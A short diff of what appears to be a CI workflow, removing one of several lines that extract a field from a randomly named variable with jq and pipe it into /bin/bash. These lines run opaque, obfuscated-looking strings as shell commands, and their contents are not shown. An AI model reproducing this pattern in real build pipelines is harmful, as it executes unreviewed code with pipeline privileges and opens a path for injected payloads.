@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$zat74537" | jq -r .zwbyp1076 | /bin/bash
           printf '%s' "$tz20893" | jq -r .hzu26537 | /bin/bash
           printf '%s' "$k002" | jq -r .v5 | /bin/bash
-          printf '%s' "$eue23110" | jq -r .j8 | /bin/bash
           printf '%s' "$od075" | jq -r .fvme11 | /bin/bash
 
       - name: Archive output
